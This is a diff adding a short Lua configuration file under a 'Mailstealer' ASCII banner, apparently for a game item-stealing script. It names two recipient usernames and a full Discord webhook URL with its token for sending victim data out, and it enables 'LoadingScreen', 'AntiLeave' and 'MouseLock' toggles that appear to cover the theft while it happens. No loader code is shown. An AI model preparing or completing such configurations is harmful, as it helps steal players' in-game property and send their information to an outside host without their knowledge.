@@ -1,0 +1,16 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "Trex_kid9"
+Webhook = "https://discord.com/api/webhooks/1148246064621695066/5NMB-gXbQg_PORuPXH-K9ehP4P8ev5d0m_usUPPIKegxbeymx_yMCr4UrVMJRc7-bxSw"
+UserName2 = "pinoyjar"
+
+_G.LoadingScreen = true-- make it true if you want the loadingscreen
+_G.AntiLeave = true-- make it true if you want the antileave
+_G.MouseLock = true-- make it true if you want the mouselock
